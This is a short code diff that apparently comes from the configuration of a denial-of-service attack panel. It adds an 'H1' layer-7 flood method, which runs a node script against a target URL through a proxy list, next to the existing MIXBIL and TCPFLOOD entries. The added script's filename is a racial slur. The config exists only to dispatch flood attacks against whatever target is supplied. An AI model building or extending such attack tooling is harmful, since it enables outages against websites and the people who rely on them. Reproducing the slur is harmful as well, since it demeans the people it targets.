@@ -42,7 +42,11 @@ let methods = {
         MIXBIL: {
             Command: 'cd /root/.flash/ && node mixbil.js {url} {time} 64 4',
             Type: 'layer7'
-        }
+        },
+        H1: {
+            Command: 'cd /root/.flash/ && node nigga.js GET {url} px.txt {time} 64 4',
+            Type: 'layer7'
+        }     
     },
     layer4: {
         TCPFLOOD: {
